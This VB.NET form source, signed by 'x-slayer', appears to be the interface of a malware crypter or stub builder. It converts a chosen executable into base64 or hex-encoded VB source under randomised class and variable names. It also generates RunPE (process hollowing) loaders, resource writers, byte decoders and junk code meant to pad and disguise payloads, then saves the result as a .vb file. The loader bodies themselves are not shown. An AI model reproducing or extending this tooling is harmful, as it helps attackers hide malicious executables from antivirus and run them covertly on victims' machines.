﻿Imports System.IO

Public Class Form1

    Private Sub TwitchRadiobutton1_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub NyX_Button18_Click(sender As Object, e As EventArgs) Handles NyX_Button18.Click
       Dim ofd As New OpenFileDialog
        ofd.Filter = "Executable|*.exe"
        If ofd.ShowDialog = Windows.Forms.DialogResult.OK Then TextBox1.Text = ofd.FileName Else TextBox1.Text = ""
    End Sub

    Private Sub NyX_Button2_Click(sender As Object, e As EventArgs) Handles NyX_Button2.Click
        If TextBox1.Text = "" Then
            MsgBox("Please Add File To Convert", MsgBoxStyle.ApplicationModal)
        Else
            Try
                TextBox2.Text = ""
                Dim iheb() As Byte = Compression.Compress(System.IO.File.ReadAllBytes(TextBox1.Text)) 'compress
                TextBox2.Text = Convert.ToBase64String(iheb)
            Catch ex As Exception
            End Try
        End If
    End Sub

    Private Sub NyX_Button3_Click(sender As Object, e As EventArgs) Handles NyX_Button3.Click
        TextBox3.Text = GeneratePassword(True, True, False, False, RandomNumber(10, 8))
        TextBox4.Text = GeneratePassword(True, True, False, False, RandomNumber(10, 8))
    End Sub

    Private Sub NyX_Button4_Click(sender As Object, e As EventArgs) Handles NyX_Button4.Click
        If TextBox1.Text = "" Then
            MsgBox("NO File To Convert", MsgBoxStyle.ApplicationModal)
        Else
            Dim num As Long
            Dim num3 As Integer = Convert.ToInt32(NumericUpDown1.Value)
            Dim text As String = TextBox1.Text
            Dim writer As New StreamWriter((Application.StartupPath & "/tempo.tmp"))
            Dim length As Long = New FileInfo(TextBox1.Text).Length
            Dim strArray As String() = New String((CInt(length) + 1) - 1) {}
            Dim buffer As Byte() = New Byte((CInt(length) + 1) - 1) {}
            buffer = FileToByteArray(TextBox1.Text)
            length = (length - 1)
            writer.Write(String.Concat(New String() {"Public Class Slayer" & vbNewLine & "Dim ", TextBox4.Text, " As String" & ChrW(13) & ChrW(10) & ChrW(13) & ChrW(10) & ChrW(13) & ChrW(10) & "Sub ", TextBox3.Text, "()" & ChrW(13) & ChrW(10)}))
            Dim num4 As Long = length
            num = 0
            Do While (num <= num4)
                strArray(CInt(num)) = Conversion.Hex(buffer(CInt(num)))
                If (strArray(CInt(num)).Length = 1) Then
                    strArray(CInt(num)) = ("0" & strArray(CInt(num)))
                End If
                num = (num + 1)
            Loop
            writer.Write((ChrW(13) & ChrW(10) & TextBox4.Text & " = """ & strArray(0)))
            Dim num5 As Long = length
            num = 1
            Do While (num <= num5)
                If ((CDbl(num) Mod (CDbl(num3) / 2)) = 0) Then
                    writer.Write(String.Concat(New String() {"""" & ChrW(13) & ChrW(10), TextBox4.Text, " = ", TextBox4.Text, " & """, strArray(CInt(num))}))
                Else
                    writer.Write(strArray(CInt(num)))
                End If
                num = (num + 1)
            Loop
            writer.Write("""" & ChrW(13) & ChrW(10) & ChrW(13) & ChrW(10) & "End Sub" & vbNewLine & "End Class")
            writer.Close()
            TextBox2.Text = File.ReadAllText(Application.StartupPath & "/tempo.tmp")
            File.Delete(Application.StartupPath & "/tempo.tmp")
        End If
    End Sub

    Private Sub NyX_Button5_Click(sender As Object, e As EventArgs) Handles NyX_Button5.Click
        If RadioButton1.Checked = True Then
            TextBox2.Text = ""
            TextBox2.Text = "'Coded By x-slayer" & vbNewLine & vbNewLine
            TextBox2.Text = "Imports System.Runtime.InteropServices" & vbNewLine
            TextBox2.Text &= "Imports System.Text" & vbNewLine & vbNewLine
            TextBox2.Text &= RunPE3VB()
            Form2.Show()

        Else
            TextBox2.Text = ""
            TextBox2.Text &= RunPE3C()
            Form2.Show()
        End If
    End Sub

    Private Sub NyX_Button6_Click(sender As Object, e As EventArgs) Handles NyX_Button6.Click
        If RadioButton1.Checked = True Then
            TextBox2.Text = ""
            TextBox2.Text = "'Coded By x-slayer" & vbNewLine & vbNewLine
            TextBox2.Text = "Imports System, System.Collections.Generic " & vbNewLine
            TextBox2.Text &= "Imports System.Text, System.IO.Compression" & vbNewLine
            TextBox2.Text &= "Imports System.Reflection, System.IO" & vbNewLine & vbNewLine
            TextBox2.Text &= RunPE2VB()
            Form2.Show()
        Else
            TextBox2.Text = ""
            TextBox2.Text &= RunPE2C()
            'TextBox2.Text = My.Resources.RunPE2C
            Form2.Show()
        End If
    End Sub

    Private Sub NyX_Button7_Click(sender As Object, e As EventArgs) Handles NyX_Button7.Click
        If RadioButton1.Checked = True Then
            TextBox2.Text = ""
            TextBox2.Text = "'Coded By x-slayer" & vbNewLine & vbNewLine
            TextBox2.Text += "Imports System.Runtime.InteropServices" & vbNewLine
            TextBox2.Text &= "Imports System.Text" & vbNewLine & vbNewLine
            TextBox2.Text &= RunPE1VB()
            Form2.Show()
        Else
            TextBox2.Text = ""
            TextBox2.Text &= RunPE1C()
            Form2.Show()
        End If
    End Sub

    Private Sub NyX_Button1_Click(sender As Object, e As EventArgs) Handles NyX_Button1.Click
        If TextBox1.Text = "" Then
            MsgBox("No File Convert", MsgBoxStyle.ApplicationModal)
        Else
            Try
                TextBox2.Text = ""
                Dim gaith() As Byte = System.IO.File.ReadAllBytes(TextBox1.Text) 'compress
                TextBox2.Text = Convert.ToBase64String(gaith)
            Catch ex As Exception
            End Try
        End If
    End Sub

    Private Sub NyX_Button8_Click(sender As Object, e As EventArgs) Handles NyX_Button8.Click

        If RadioButton1.Checked = True Then
            TextBox2.Text = ""
            TextBox2.Text = "'Coded By X-Slayer" & vbNewLine & vbNewLine
            TextBox2.Text += "Imports System.IO.Compression" & vbNewLine
            TextBox2.Text += "Imports System.IO" & vbNewLine & vbNewLine
            TextBox2.Text += My.Resources.CompressVB
        Else
            TextBox2.Text = ""
            TextBox2.Text += My.Resources.CompressC
        End If
    End Sub

    Private Sub NyX_Button9_Click(sender As Object, e As EventArgs) Handles NyX_Button9.Click
        If RadioButton1.Checked = True Then
            TextBox2.Text = ""
            'Hex2Byte()
            TextBox2.Text = "'Coded By X-Slayer" & vbNewLine & vbNewLine
            TextBox2.Text += Hex2ByteVB()
        Else
            TextBox2.Text = ""
            'Hex2Byte()
            TextBox2.Text = Hex2ByteC()
        End If
    End Sub

    Private Sub NyX_Button10_Click(sender As Object, e As EventArgs) Handles NyX_Button10.Click
        If RadioButton1.Checked = True Then
            TextBox2.Text = ""
            TextBox2.Text = "'Coded By X-Slayer" & vbNewLine & vbNewLine
            TextBox2.Text += My.Resources.ResWritVBCode
        Else
            TextBox2.Text = ""
            TextBox2.Text = My.Resources.ResWritCCod
        End If
    End Sub

    Private Sub NyX_Button11_Click(sender As Object, e As EventArgs) Handles NyX_Button11.Click
        If RadioButton1.Checked = True Then
            TextBox2.Text = ""
            TextBox2.Text = "'Coded By X-Slayer" & vbNewLine & vbNewLine
            TextBox2.Text = "Imports System.Runtime.InteropServices" & vbNewLine
            TextBox2.Text += ResourceWriterVB()
            Form2.Show()
        Else
            TextBox2.Text = ""
            TextBox2.Text += ResourceWriterC()
            Form2.Show()
        End If
    End Sub

    Private Sub NyX_Button12_Click(sender As Object, e As EventArgs) Handles NyX_Button12.Click
        If RadioButton1.Checked = True Then
            TextBox2.Text = ""
            TextBox2.Text = JunkStringVB(NumericUpDown2.Value)
        Else
            TextBox2.Text = ""
            TextBox2.Text = JunkStringC(NumericUpDown2.Value)
        End If
    End Sub

    Private Sub NyX_Button13_Click(sender As Object, e As EventArgs) Handles NyX_Button13.Click
        If RadioButton1.Checked = True Then
            TextBox2.Text = ""
            TextBox2.Text = "'Coded By X-Slayer" & vbNewLine & vbNewLine
            TextBox2.Text += GenerateJunk(NumericUpDown3.Value)
        Else
            'TextBox2.Text = ""
            'TextBox2.Text = JunkStringC(NumericUpDown3.Value)
            MsgBox("Not Yet", MsgBoxStyle.ApplicationModal)
        End If
    End Sub

    Private Sub NyX_Button17_Click(sender As Object, e As EventArgs) Handles NyX_Button17.Click
        Clipboard.Clear()
        If TextBox2.Text = "" Then
            MsgBox("No Text To Copy", MsgBoxStyle.Critical, "Information")
            Exit Sub
        End If
        Clipboard.SetText(TextBox2.Text)
        MsgBox("text Copied to Clipboard", MsgBoxStyle.Information, "Information")
    End Sub

    Private Sub NyX_Button16_Click(sender As Object, e As EventArgs) Handles NyX_Button16.Click
        TextBox2.Text = ""
        TextBox2.Text = Clipboard.GetText
    End Sub

    Private Sub NyX_Button15_Click(sender As Object, e As EventArgs) Handles NyX_Button15.Click
        TextBox2.Text = ""
    End Sub

    Private Sub NyX_Button14_Click(sender As Object, e As EventArgs) Handles NyX_Button14.Click
        Dim sfd As New SaveFileDialog ' New SaveFileDialog to chosse the server location
        sfd.Filter = "Visual Basic|*.vb"
        If sfd.ShowDialog = Windows.Forms.DialogResult.OK Then
            File.WriteAllText(sfd.FileName, TextBox2.Text)
            MsgBox("Saved To : " & sfd.FileName, MsgBoxStyle.Information, "Information")
        End If
    End Sub

    Private Sub NyX_Button19_Click(sender As Object, e As EventArgs) Handles NyX_Button19.Click
        Form3.Show()
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        about.Show()
    End Sub
End Class
